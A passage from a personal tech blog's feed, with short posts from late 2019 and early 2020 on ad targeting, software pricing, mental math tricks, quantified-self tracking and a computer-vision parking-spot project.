  <li><strong>Quantified self dashboard</strong>. I’m into this idea yet have done very little outside my <a href="/2020/01/17/visualizing-my-2019/">simple daily spreadsheet</a>. You don’t improve what you don’t measure and the goal for 2020 is to start measuring more and more of my life. The measurable goal here is to have a personal dashboard that is updated multiple times a day with at least 3 health metrics.</li>
  <li><strong>Another coding side project</strong>. This is an open-ended one but as I’ve started managing I haven’t gotten to spend as much time coding. I want to get back to some code in 2020 and the goal is to develop a side project that will be launched and maintained throughout 2020. I have a few ideas floating around and will pick one to pursue over the next few weeks.</li>
</ul>

<p>In true OKR fashion I should probably also commit to quarterly updates so stay tuned for the next one in April.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Software comparison done right</title>
   <link href="http://dangoldin.com/2020/01/24/software-comparison-done-right/"/>
   <updated>2020-01-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/24/software-comparison-done-right</id>
   <content:encoded><![CDATA[
<p>There are a variety of sites out there that exist solely to do comparisons of enterprise software - just type “product A vs product B” in Google and the first few pages will be littered with results. They all generally follow the same format: a side by side table comparing them feature by feature. Some of the values are factual - for example pricing - while others are based on user reviews.</p>

<p>The fact that so many of these exist indicate that many find these sorts of comparisons useful but what I really want to know is the actual customer usage of the product. A product may hit all the right features but if it’s not actually been adopted by customers then the features are for naught.</p>

<p>Luckily, Okta (a Single Sign-on vendor) recently published a thorough <a href="https://www.okta.com/businesses-at-work/2020/">report</a> covering the software their customers used. Okta has a laundry list of prestige customers that they’re able to provide a representative report of the most used software by today’s businesses. I’d trust this data over any of the side by side comparison sites.</p>

<p>It’s incredibly strong content marketing by Okta: easy to put together, extremely useful, and highlights their market dominance. If you haven’t taken a look yet <a href="https://www.okta.com/businesses-at-work/2020/">it’s</a> well worth checking out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Instagram targeting ads based on likes</title>
   <link href="http://dangoldin.com/2020/01/21/instagram-targeting-ads-based-on-likes/"/>
   <updated>2020-01-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/21/instagram-targeting-ads-based-on-likes</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/instagram-milkbar-ad.png" alt="The Milk Bar image I liked" width="451" height="706" layout="responsive"/>

<p>I noticed a new type of ad targeting behavior on Instagram I haven’t seen before - liking someone’s shot containing a product leads to a targeted ad containing that product. In my case, a friend posted a picture of an order from the Milk Bar and I gave it a friendly like. A few days later I started seeing ads for the Milk Bar Store. I know it may seem like a manifestation of the <a href="https://science.howstuffworks.com/life/inside-the-mind/human-brain/baader-meinhof-phenomenon.htm">Baader-Meinhof phenomenon</a> but I tend to notice ads and am pretty certain I have not seen any Milk Bar ad until I liked that image.</p>

<p>It’s not a surprising move and is actually quite clever - the fact that someone likes a particular image of a product is an indication that they may be interested in buying it. Depending on the product it may also not be difficult to do - especially if they can rely on the captions and hashtags for the identification in addition to the image itself. At the same time, it is a very real example of how sophisticated modern ad targeting has gotten and how strong a position Facebook has. This interest data is not visible outside Facebook and allows Facebook to provide a much richer targeting experience than any competitor. In some ways it’s no different than a tracking company building up a profile of you based on the sites you visit but at the same time this is a much sharper and exacting profile.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my 2019</title>
   <link href="http://dangoldin.com/2020/01/17/visualizing-my-2019/"/>
   <updated>2020-01-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/17/visualizing-my-2019</id>
   <content:encoded><![CDATA[
<p>In order to better understand myself, I’ve been collecting daily stats over the past few years with the idea that tracking various metrics would show me ways to improve. This happened to some degree - seeing many of the numbers leads to a sense of shame - but there hasn’t been a huge insight that looks at the interaction of the various items I track. To do that, I suspect I need to dive deeper into the quantified self movement and start continually tracking my physiological metrics rather than the current approach of a daily check-in describing my mood and what I consumed.</p>

<p>At least that’s the hope for 2020. For 2019, I modified an old script to help visualize the data I collected and while there’s not a huge amount that stood out there’s something about a whole year expressed through a series of data visualizations.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/sleep-duration-2017.png" alt="Sleep duration" width="800" height="600" layout="responsive"/>
      <p>Around 7 hours of sleep a night with a pretty tight range. A few outliers but those are primarily data tracking issues when using Sleep Cycle and multiple sleep periods.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/coffee-tea-alcohol-coke-weekly-2019.png" alt="Coffee tea alcohol coke by week" width="800" height="600" layout="responsive"/>
      <p>Week consumption of coffee, tea, alcohol, and coke (my primary soda) box plot.I'm pretty happy with the results. I'm consuming much less alcohol and soda than I used to and coffee is just under 2 cups a day.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-breakfast-2019.png" alt="Breakfast wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>I love my eggs for breakfast. Cheese is a close second.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-lunch-2019.png" alt="Lunch wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>A little bit more variety here than breakfast but still quite heavy on the chicken and salad. The sour cream is probably a surprise to many but as a Russian that's my salad condiment of choice. The beef burrito from the nearby burrito truck also makes an appearance in the top 10.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-dinner-2019.png" alt="Dinner wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Dinner is surprisingly similar to lunch.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-snack-2019.png" alt="Snack wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>The unhealthiest of the meals. Goal for 2020 is reduce my sugar consumption.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-drinkslist-2019.png" alt="Drinks wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Shows my drinking distribution. Coffee is up there as well as the various alcohols.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/alcohollag-vs-sleepduration-2019.png" alt="Drinks wordcloud" width="800" height="600" layout="responsive"/>
      <p>This is one of the more interesting ones but shows the relationship between my alcohol consumption and the subsequent amount of sleep. No surprise that the nights I don't drink I sleep more but the effect is pronounced.</p>
    </div>
  </li>
</ul>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Whatever happened to fast software?</title>
   <link href="http://dangoldin.com/2020/01/14/whatever-happened-to-fast-software/"/>
   <updated>2020-01-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/14/whatever-happened-to-fast-software</id>
   <content:encoded><![CDATA[
<p>Maybe it’s just me but it feels as if modern software has been getting slower and slower. My computer is the fastest it has ever been and yet I’m more frustrated by the actual performance more than ever. Websites seem slower than they’ve ever been and I often find myself typing faster than the letters appear on the screen. Part of the problem is that everything seems to be web-based; in fact, many “desktop” apps are powered by Electron which is a wrapper around Chromium that makes it easy to write desktop apps. Unfortunately, easy doesn’t mean fast and we get the performance of a browser tab in standalone tab.</p>

<p>I genuinely believe there’s an opportunity for a company to start implementing every single popular web product in native desktop apps optimized for performance. Excel remains remains my favorite application - it’s fast, responsive, and has a ton of shortcuts for the power user. No matter how much work Google puts into Spreadsheets it still falls short of Excel. There’s just something about having a perfectly tuned desktop app that gets out of the way to let you focus on the work. It’s unfortunate how rare good software is these days and I like to think we’re due for a software renaissance.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Quick math calculations</title>
   <link href="http://dangoldin.com/2020/01/10/quick-math-calculations/"/>
   <updated>2020-01-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/10/quick-math-calculations</id>
   <content:encoded><![CDATA[
<amp-twitter width="609" height="274" layout="responsive" data-tweetid="1222729308935991298">
</amp-twitter>

<p>I came across a tweet earlier today that received a surprisingly large reaction for a relatively simple math shortcut: “Percentages are reversible. 8% of 25 is the as 25% of 8 and one of them is much easier to do in your head.” I followed it up with one of my own: “Similar one is use factors of 10. Want to divide by 5? Multiply by 2 and shift decimal point. 24/5=24*2/10=4.8 same with 4 and 25., 8 and 125, etc”</p>

<p>Despite nearly everyone having incredibly powerful calculators in our pockets these math shortcuts are valuable useful to have. It makes it that much easier to do back-of-the-envelope calculations and quickly validate some assumptions without disrupting the flow with a screen. It also keeps the brain sharp and fights the natural inclination to be lazy.</p>

<p>A few other helpful math tricks I’ve used over the years:</p>

<ul>
  <li>Round and then adjust. When numbers are close to multiples of 10 or 5 just round them and then adjust after the calculation. For example: 49 * 14 = (50 * 15) - (14 + 49) - 1. This relies on knowing that that (x+1)(y+1) =  x*y + x + y + 1 and solving for x * y = (x+1)(y+1) - x - y - 1.</li>
  <li>Multiplying numbers that differ by 2. For example, 14 * 16. Another algebraic identity is (x-1)(x+1) = x<em>x - 1. In this case we can do 15</em>15 - 1 = 224.</li>
  <li>There are countless others designed for specific numbers - for example squaring numbers ending in 5, multiplying by 11, etc - but I find them to be too unique to be useful.</li>
</ul>

<p>More often than not, a simple approximation done quickly is more valuable than the perfect answer even a minute later. It’s a way of validating or invalidating your intuition and having a few techniques is often good enough and allows you to quickly move on to the next thought.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Social network usage is exclusive</title>
   <link href="http://dangoldin.com/2020/01/07/social-network-usage-is-exclusive/"/>
   <updated>2020-01-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/07/social-network-usage-is-exclusive</id>
   <content:encoded><![CDATA[
<p>I remember the day when there were dozens of social networks with people hopping from one to another. These days it feels that there are only four: Facebook, Instagram (I’m explicitly separating it out from Facebook), Twitter, and Snapchat. This is a very US view and I realize there are tons of niche ones but at this point it feels as if those constitute the bulk of usage. More importantly, and this is pure speculation, it seems as if you pick a random person and look at their social network usage it’s very likely they’re spending the majority, if not all of their time, in only one of those networks.</p>

<p>It used to be the case that each network was novel and people were exploring each one. This market is now mature and most people have gravitated to the one that works for them. Of course we still respond to notifications and passively engage on the other networks but we each have our favorite that we spend the majority of time on. Mine is Twitter - I like the fast pace, the quick access to news, and the ability to quickly engage with a wide audience. Others may prefer the purely visual nature of Instagram while others want the ephemeral privacy offered by Snapchat. And everyone else is a Facebook user.</p>

<p>It’s tough to think of another social network as popular as the above but TikTok seems to be doing phenomenally well and I wouldn’t be surprised if someone is busy at work in their garage on an app that will appeal to a new human nature.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Build for optionality</title>
   <link href="http://dangoldin.com/2020/01/03/build-for-optionality/"/>
   <updated>2020-01-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/03/build-for-optionality</id>
   <content:encoded><![CDATA[
<p>I wrote a company wide email back in September titled “Building for optionality” that describes how our engineering team maintains its impact despite the growing complexity of the business. There are a few TripleLift-specific concepts that I stripped away to make it more approachable but the theme is the same.</p>

<hr />

<p>For a company that’s growing and changing as quickly as TripleLift, it’s critical to make sure our code is as impactful as possible. One way we do this is by building for optionality.</p>

<p>The idea here is that the future is uncertain and we strive to design our solutions in ways that allow us to pivot and leverage them to support domains and problems that we may not yet be aware of. When faced with choices, rather than focusing on an individual feature we endeavor to think of ways to extend our overall platform that can then be used to support a variety of evolving business cases.</p>

<p>This approach can be seen by the types of building blocks we create. Rather than solve the immediate problem it’s useful to take a step back and see whether there’s a pattern here and whether introducing intermediary concepts will give us a springboard into another potential opportunity. Unfortunately, this can easily lead to overengineering and solving problems you don’t yet have which results in a codebase that’s more and more difficult to rein in and manage.</p>

<p>The ideal is to build in these layers of optionality when you’re building something new and uncertain but as the business evolves and you develop crisp business cases you invest in tighter and more optimal solutions. The challenge is finding that optimal point where the complexity and risk outweigh the value of this optionality.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Self hosted, externally managed</title>
   <link href="http://dangoldin.com/2019/12/31/self-hosted-externally-managed/"/>
   <updated>2019-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/31/self-hosted-externally-managed</id>
   <content:encoded><![CDATA[
<p>A couple of days ago I <a href="/2019/12/27/whos-hosting-whos-managing/">wrote</a> about two questions one can ask when it comes to working with a technology vendor: who’s hosting and who’s managing?</p>

<p>I find the externally managed but self hosted one interesting. You’re giving another company access to your accounts and have full visibility into what they’re doing yet you still pay them. An example of this is <a href="https://databricks.com/">Databricks</a>. They offer a product akin to Spark-as-a-service along with a variety of bells and whistles that make it much easier to run and manage.</p>

<p>The primary Databricks product spins up instances in your cloud account, runs the proprietary Databricks code, and then charges you based on separate “Compute Units” that are a function of the instance type. This pricing model is interesting. Why not spin the instances up in their account and then charge you the total cost? You wouldn’t need to worry about the instance type to compute unit conversion and the final cost would be transparent.</p>

<p>On the flipside, you wouldn’t have as much visibility into the underlying hardware and the impact it has on performance. My gut is that the primary motivation is to allow customers to keep all cloud costs within their own account. This gives them the benefit of being able to manage their own cloud costs - for example by negotiating for a discount on higher spend or through instance reservations. This is a way of both passing on savings to their customers who understand their own use case better as well as making the Databricks bill lower than it actually is.</p>

<p>While many open source companies are struggling to compete against the cloud vendors Databricks is able to hold their own. Part of it is the uniqueness and value of the product but a large part is their pricing and billing.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Power of media</title>
   <link href="http://dangoldin.com/2019/12/31/power-of-media/"/>
   <updated>2019-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/31/power-of-media</id>
   <content:encoded><![CDATA[
<p>Despite the fact that the Marvel news about a transgender character is not true it reinforced how significant media is to progress and growth of culture. Adults are set in their ways and are less impressionable than children. By exposing children to a more accepting world we help make it a reality. It’s unfortunate that this news turned out to be false but the fact that it was even believable is a sign that we’re making progress. I have no doubt that it will happen and it’s only a question of when.</p>

<p>I used to be a cynic when it comes to media and its consumption and yet I can’t help but feel it’s actually what improves society. It may feel that the media these days is playing to our worst desires and yet I can’t help but feel optimistic.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gaming virtual kitchens</title>
   <link href="http://dangoldin.com/2019/12/31/gaming-virtual-kitchens/"/>
   <updated>2019-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/31/gaming-virtual-kitchens</id>
   <content:encoded><![CDATA[
<p>Given how popular food delivery has gotten it’s no surprise that some restaurants are opting out of a retail location and are starting to rely solely on their delivery efforts. This is leading to a variety of companies that are building kitchens that can be rented out by these types of restaurants. In fact, one of them, <a href="https://www.cloudkitchens.com/">CloudKitchens</a>, is Travis Kalanick new startup attempt.</p>

<p>Given that these businesses depend on food delivery platforms and they don’t actually have a retail location I wonder if these restaurants are creating multiple listings on these platforms. This gives them another spot in the search results and allows them to crowd out their competitors. Of course, each would have a reduced number of orders and thus show up lower in the results but it still feels as if there’s potential for some gaming.</p>

<p>Similar to how SEO started to get gamed soon after it proved to be valuable we’ll see the same occur on the newer platforms. Wherever there’s an opportunity there will be some that try to take advantage.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Farewell 2019, hello 2020</title>
   <link href="http://dangoldin.com/2019/12/31/farewell-2019-hello-2020/"/>
   <updated>2019-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/31/farewell-2019-hello-2020</id>
   <content:encoded><![CDATA[
<p>Bill Gates once said “Most people overestimate what they can do in one year and underestimate what they can do in ten years” and it’s a good assessment of my decade. It was my first decade as an adult and it was very much about finding my footing, both professionally and personally. My first few years out of college were trying to figure things out and understand who I am and what I enjoy doing. I started the decade working as a quant, to attempting two startups, to joining a quickly growing <a href="https://triplelift.com/">startup</a> that I’ve been at for the past 6 years.</p>

<p>It’s been an incredibly busy 10 years and I look forward to the next 10. Rather than breadth these will be focused on depth and I hope to write another short blog post then.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Advertising an Airbnb on Instagram</title>
   <link href="http://dangoldin.com/2019/12/31/advertising-an-airbnb-on-instagram/"/>
   <updated>2019-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/31/advertising-an-airbnb-on-instagram</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/airbnb-instagram-ad.png" alt="An Airbnb ad on instagram" width="828" height="1792" layout="responsive"/>

<p>I saw an ad for a specific <a href="https://www.instagram.com/hudsonvalleyairbnb/">Airbnb</a> on Instagram and just don’t understand the economics. It seems unlikely that running this sort of campaign ends up being profitable. I’d expect the overlap between the audience targeted and those interested in booking the Airbnb to be extremely low and potentially non-existent.</p>

<p>This Airbnb has a nightly rate of ~$350 and a cleaning fee of $199. If we assume that the average guest books for 3 nights the host is getting ~$1,220 after Airbnb fees ($350 * 0.97 * 3 + $199). Let’s also assume that the mortgage, maintenance, and utilities are $5,000/month with an aggressive occupancy rate of 75%. That leads us to an actual monthly profit of $2,638 ($350 * 30 * 0.97 * 0.75 - $5000) across 7.5 (30 * 0.75/3) guests, or a per guest profit of $351.73 ($2,638 / 7.5).</p>

<p>Doing some minimal research it looks as if the cost per click of an Instagram ad is anywhere from $0.50 - $1.00. Using the low end of this range we see that we’re break-even so long as a single person books out of the ~700 ($351/$0.50) clicks. That actually feels doable - 1 sale out of 700 clicks doesn’t seem too bad.</p>

<p>For this exercise I made some favorable assumptions and I suspect the actual economics are worse than this. The occupancy rate is likely lower than the 75% and is one of the key factors in determining profitability. Unlike an ecommerce site where multiple buyers can all buy the same item at the same time a house can only be rented by a single person at a time. Even if someone was interested in enough to book this Airbnb they would need to be the first ones interested in that specific date slot.</p>

<p>It’s possible that this campaign actually works - it could have very precise targeting and only over an optimal time frame. In any case it’s impressive - either it’s possible to profitably advertise an Airbnb on Instagram or it’s close enough that it’s worth an attempt. Who knows - maybe their model takes into account a random blogger posting about it and driving additional reach.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Zappos customer service</title>
   <link href="http://dangoldin.com/2019/12/30/zappos-customer-service/"/>
   <updated>2019-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/30/zappos-customer-service</id>
   <content:encoded><![CDATA[
<p>The outcome of the Zappos class action settlement was 10% of an order that needs to be made by January 2020. That’s better than nothing so I decided to take them up on it and the entire experience left me with an even deeper appreciation of the Zappos customers service. They’re one of the few e-commerce companies that built a reputation on exceptional customer service and it’s impressive that they’re still able to maintain it 20 years in.</p>

<p>My experience was pretty simple: I ordered a pair of shoes but they ran large. I reached out to have Zappos send a smaller pair and unfortunately those were too large as well. Now I’m waiting for the third pair and still haven’t needed to send anything back. This level of trust is rare and I appreciate their willingness to give people this “float.” I know many people will order a few sizes, find the one that fits, then send the extras back. That approach would have served me well in this case but that just feels too wasteful. Although the constant back and forth is not much better.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Finding parked cars: AWS vs Google computer vision</title>
   <link href="http://dangoldin.com/2019/12/29/finding-parked-cars-aws-vs-google-computer-vision/"/>
   <updated>2019-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/29/finding-parked-cars-aws-vs-google-computer-vision</id>
   <content:encoded><![CDATA[
<p>As part of the newly rebooted <a href="http://dangoldin.com/2019/12/26/parking-spot-finder/">Parking Spot Finder</a> project I started poking around the cloud computer vision services to see how well they’d do at identifying parked cars from an “apartment view.” The image is pretty straightforward and shows two intersecting streets with a single available parking spot. I didn’t expect these services to identify the spot but my hope was that they’d be able to identify the cars themselves. For this test I tried both Google’s <a href="https://cloud.google.com/vision/">Vision</a> and Amazon <a href="https://aws.amazon.com/rekognition/">Rekognition</a>. Google worked much better but still required a few tweaks to get what I wanted.</p>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking.jpg" alt="Original image of the street" width="1314" height="986" layout="responsive"/>
    <p class="caption">Original image</p>
</div>

<h3 id="first-attempt">First attempt</h3>
<p>The simplest thing to do was to take the image I took and just pass it to both services in order to see what I got. I didn’t have any strong expectations here but was hopeful that at least one of the services would give me exactly what I wanted. Alas, both services failed to give me what I wanted. Google focused on the buildings while Amazon picked up a handful of the cars.</p>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-google.png" alt="Google CV" width="815" height="496" layout="responsive"/>
    <p class="caption">Google's attempt</p>
</div>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-aws.png" alt="AWS CV" width="1593" height="611" layout="responsive"/>
    <p class="caption">Amazon's attempt</p>
</div>

<h3 id="second-attempt">Second attempt</h3>
<p>The thinking here was that Google focused too much on the buildings since they took up the majority of the image. What if I cropped those out and only passed in images of the street? Would they be able to identify each of the parked cars? In this case Google was perfect and found every parked car while Amazon floundered.</p>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-1.png" alt="Street view crop 1" width="362" height="130" layout="intrinsic"/>
    <p class="caption">Original image: First crop</p>
</div>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-2.png" alt="Street view crop 2" width="264" height="317" layout="intrinsic"/>
    <p class="caption">Original image: Second crop</p>
</div>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-1-google.png" alt="Google attempt crop 1" width="821" height="493" layout="intrinsic"/>
    <p class="caption">Google's attempt: First crop</p>
</div>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-2-google.png" alt="Google attempt crop 2" width="780" height="497" layout="intrinsic"/>
    <p class="caption">Google's attempt: Second crop</p>
</div>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-1-aws.png" alt="Amazon attempt crop 1" width="1588" height="618" layout="intrinsic"/>
    <p class="caption">Amazon's attempt: First crop</p>
</div>

<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-2-aws.png" alt="Amazon attempt crop 2" width="1590" height="616" layout="intrinsic"/>
    <p class="caption">Amazon's attempt: Second crop</p>
</div>

<p>The nice thing is that I do have a working solution here and the next step is to see what I can do to automate the cropping piece and leverage the structured data to hopefully get something meaningful.  The nice thing is that the final state is well defined - a tagged outline of the available parking spots. There’s still a lot of work to get there but that’s all part of the fun.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gboard vs iOS swipe keyboard</title>
   <link href="http://dangoldin.com/2019/12/28/gboard-vs-ios-swipe-keyboard/"/>
   <updated>2019-12-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/28/gboard-vs-ios-swipe-keyboard</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/keyboard-gboard.jpg" alt="Gboard keyboard" width="828" height="894" layout="intrinsic"/>

<img src="http://dangoldin.com/assets/static/images/keyboard-ios.jpg" alt="Gboard keyboard" width="828" height="852" layout="intrinsic"/>

<p>Now that I’ve been blogging <a href="http://dangoldin.com/2019/12/24/write-mobile-edit-desktop/">left-handed on my phone</a> for the post week I got the chance to try out multiple iOS keyboards all with the hope of improving my typing speed. So far the best one had been <a href="https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin&amp;hl=en_US">Gboard</a> using the swipe. It’s pretty similar to the native swipe keyboard offered within iOS but it’s just a tad more accurate - especially for shorter words.</p>

<p>Google has the reputation of being the AI and ML leader and it shows in the corrections and predictions. They’re likely training on larger corpus of data and leveraging the contextual information more intelligently. For example, Gboard is able to correct previously typed words based on subsequent words whereas once a word is written in the native iOS keyboard it’s finalized. Each of the keyboards still struggles with short words that lack context, esoteric and rarely used words, but overall it’s surprisingly effective and will continue to improve. Correcting mistakes is still a huge pain but at least in my case it’s a problem that can be solved later on an actual keyboard.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Who's hosting? Who's managing?</title>
   <link href="http://dangoldin.com/2019/12/27/whos-hosting-whos-managing/"/>
   <updated>2019-12-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/27/whos-hosting-whos-managing</id>
   <content:encoded><![CDATA[
<p>The end of the year is when companies get inundated with a ton of vendors trying to hit their sales goals. Given this volume comparisons start to become easier and patterns start to emerge. One that I noticed is the gamut of hosting options as well as managed options.</p>

<p>For hosting options, you can choose either the self-hosted option where the software is deployed to your own infrastructure. Alternatively, you can pay the vendor to deploy the code to their infrastructure and expose it through the necessary interfaces.</p>

<p>Managing options are similar, you can either choose to manage the software yourself which requires your team to do the deployment and configuration. On the other hand, you can pay a vendor to deploy and manage the service on your behalf.</p>

<p>They’re not truly independent but it is useful to think about them independently. The more data-heavy products tend to fall into the self-hosted camp since you generally want customers to understand the hardware they’re using. A company such as <a href="https://databricks.com/">Databricks</a> falls into this camp. They will spin instances up your cloud account and will then charge a separate “Compute Cost” that varies across instance types. Companies that provide a more atomic, less customizable service, on the other hand, tend to go for the third party hosted option. Someone like <a href="https://www.confluent.io/">Confluent</a> (although they do have other hosting options) falls into this camp. They offer a hosted Kafka offering that is deployed within their account. The way the product is exposed to customers is simpler (I/O bandwidth, storage, retention) and there’s no need to expose the complexity of the deployment to customers.</p>

<p>There’s no “right” approach here and this framework is still half baked but my gut is there’s something deeper here I need to think more about.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Drop in piracy, drop in accessibility</title>
   <link href="http://dangoldin.com/2019/12/27/drop-in-piracy-drop-in-accessibility/"/>
   <updated>2019-12-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/27/drop-in-piracy-drop-in-accessibility</id>
   <content:encoded><![CDATA[
<p>A few days ago I came across a tweet that was making the rounds:</p>

<amp-twitter width="609" height="274" layout="responsive" data-tweetid="1209255772250611712">
</amp-twitter>

<p>I agree with the sentiment and know how much I benefited from having access to software as a kid. It got me both interested in computers and gave me a head start on writing code.</p>

<p>The one point that’s missed here is how difficult it is to pirate software these days. In the early days of the internet it would take a very, very long time to download applications but nearly all were piratable - even if it did require running some obscure code and editing hex files. These days, nearly all substantial software is subscription based which makes it incredibly difficult, and potentially impossible, to pirate. This doesn’t affect the well-off but it becomes more and more inaccessible for those that just can’t afford it.</p>

<p>I’m not advocating piracy but the fact that it was an option, albeit with a ton of hoops, benefited tons of people that don’t get the same benefit now. A while back I read something explaining why Microsoft doesn’t penalize pirated copies of Windows. The answer was that even pirated Wndows is better than another OS and it has the side benefit of getting more and more people used to the Microsoft stack that they will hopefully be able to legally acquire later on. Sure Microsoft was in the dominant market position and was able to afford this perspective but there is some truth to it. Always on, subscription software does lead to a decline in piracy but what’s the cost in accessibility? Is it a short term gain for a long term loss?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Parking spot finder</title>
   <link href="http://dangoldin.com/2019/12/26/parking-spot-finder/"/>
   <updated>2019-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/26/parking-spot-finder</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/jc-street-parking.jpg" alt="Jersey City street" width="1314" height="986" layout="responsive"/>

<p>I live in Jersey City and rely on street parking rather than paying for a lot. Jersey City also some aggressive alternate side parking rules with many streets having twice-a-week cleanings which in the worst case requires me to move my car 4 times a week.</p>

<p>A few years ago I decided to build a simple tool that would be hooked up to a camera and would notify me whenever a spot became available. I unfortunately never finished that up and am hoping that by posting it publicly it will act as a motivator and hold me accountable.</p>

<p>The <a href="https://github.com/dangoldin/parking-spot-detector">repo is up on GitHub</a> for everyone who wants to follow along. I haven’t done much of this type of project so it will be a good introduction to the modern world of computer vision while also solving an actual problem.</p>

<p>The approach I’m currently taking is to first confirm that I can actually identify parking spots in static images. I’ll attempt this using the various cloud APIs as well as some open source libraries, such as <a href="https://pjreddie.com/darknet/yolo/">YOLO</a>. I’m hoping that they work but if not I’ll resort to something a bit more creative.</p>

<p>After that step is done I’ll figure out how to automate the photo taking - it may be as simple as getting my Raspberry Pi working again or somehow integrating with a webcam. In any case, I imagine this part to be more straightforward than the first.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In praise of the simple tech stack</title>
   <link href="http://dangoldin.com/2019/12/26/in-praise-of-the-simple-tech-stack/"/>
   <updated>2019-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/26/in-praise-of-the-simple-tech-stack</id>
   <content:encoded><![CDATA[
<p>These days it’s so easy to feel as if you’re falling behind the tech curve. There’s a new tool or technology being released every day and there’s a strong temptation to try everything lest you fall behind.</p>

<p>That’s why it was so refreshing to come across “<a href="https://broadcast.listennotes.com/the-boring-technology-behind-listen-notes-56697c2e347b">The boring technology behind a one-person Internet company</a>.” It’s a post written by <a href="https://broadcast.listennotes.com/@wenbinf">Wenbin Fang</a>, the founder and CEO of <a href="https://www.listennotes.com/">ListenNotes.com</a>, and is exactly what you think it is.</p>

<p>The technology is far from boring but it’s straightforward and has a proven track record. The author is comfortable with it and it allows him to focus on growing the business rather than be constantly in the weeds debugging some arcane behavior. Trying new things is incredibly valuable and is the only way we end up with improvements but this post was a nice reminder that you don’t need to be on the bleeding edge to build a successful product.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Increasing creativity</title>
   <link href="http://dangoldin.com/2019/12/25/increasing-creativity/"/>
   <updated>2019-12-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/25/increasing-creativity</id>
   <content:encoded><![CDATA[
